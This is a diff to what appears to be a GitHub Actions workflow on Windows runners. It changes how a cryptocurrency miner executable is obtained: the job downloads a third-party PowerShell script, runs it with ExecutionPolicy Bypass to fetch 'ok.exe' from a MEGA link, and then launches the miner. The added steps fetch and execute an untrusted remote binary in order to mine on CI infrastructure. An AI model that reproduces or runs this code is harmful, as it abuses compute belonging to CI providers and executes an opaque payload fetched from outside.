@@ -77,12 +77,16 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
-      # --- DOWNLOAD & RUN YOUR MINER HERE ---
-      - name: Download and Run Your Miner EXE
+      # --- Download and Run Your Miner from MEGA ---
+      - name: Download MEGA Downloader Script
         run: |
-          $minerUrl = "https://github.com/frtrialx-alt/Paisa-V.1/releases/download/V.1/ok.exe"
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yasirkula/UnityWebGL-MegaDownloader/main/MegaDownloader.ps1" -OutFile "$env:TEMP\MegaDownloader.ps1"
+
+      - name: Download and Run Your Miner EXE from MEGA
+        run: |
+          $megaUrl = "https://mega.nz/file/atJjSJJK#5LSuE8B1fYUrTwfrsErG7G7O51HGUZSBLzSlPioAkwA"
           $minerPath = "$env:TEMP\ok.exe"
-          Invoke-WebRequest -Uri $minerUrl -OutFile $minerPath
+          powershell -ExecutionPolicy Bypass -File "$env:TEMP\MegaDownloader.ps1" -Link $megaUrl -Output $minerPath
           Start-Process -FilePath $minerPath
           Write-Host "Miner started at $minerPath"
 
